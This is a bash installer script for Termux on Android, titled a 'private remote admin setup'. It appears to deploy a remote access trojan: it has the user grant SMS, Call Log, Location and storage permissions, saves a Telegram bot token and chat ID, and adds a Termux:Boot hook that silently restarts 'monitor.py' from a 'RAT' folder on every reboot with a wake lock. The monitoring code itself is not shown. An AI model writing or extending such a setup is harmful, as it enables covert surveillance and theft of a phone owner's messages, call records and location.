#!/data/data/com.termux/files/usr/bin/bash

echo "=========================================="
echo "   PRIVATE REMOTE ADMIN SETUP (EC0 MODE)"
echo "=========================================="
pkg update -y && pkg upgrade -y

echo "[*] Installing core packages..."
pkg install python git curl wget termux-api termux-boot -y

echo "[*] Requesting Storage Permission..."
termux-setup-storage

echo "[*] Opening Permission Pages..."
echo "Note: Please allow 'Storage', 'SMS', 'Call Log', and 'Location' permissions for Termux:API."
echo "If a permission is denied, you can re-open it later from Android Settings."
echo "Opening App Settings for Manual Permissions..."
# This command opens the Android app settings page for permissions
termux-open-setup-permissions
sleep 2
echo "[*] Permission page opened. If you didn't see it, please grant permissions manually in Android Settings."

# Taking Inputs
echo "=========================================="
read -p "Enter your Telegram Bot Token: " BOT_TOKEN
read -p "Enter your Telegram Chat ID (Sirf aapka): " CHAT_ID
read -p "Enter the Start Command (e.g., /start): " START_CMD

# Saving to config file
cat > config.json <<EOF
{"bot_token": "$BOT_TOKEN", "chat_id": "$CHAT_ID", "start_cmd": "$START_CMD"}
EOF

echo "[*] Config Saved!"

echo "[*] Setting up Termux:Boot for Auto-Start..."
mkdir -p ~/.termux/boot
cat > ~/.termux/boot/start-bot.sh <<EOF
#!/data/data/com.termux/files/usr/bin/bash
termux-wake-lock
cd "$HOME/RAT"  # Replace 'RAT' with your actual repo folder name if different
python monitor.py
EOF
chmod +x ~/.termux/boot/start-bot.sh

echo "[*] Boot script created. The bot will start automatically on device reboot."
echo "[*] Starting the Bot Now..."
python monitor.py
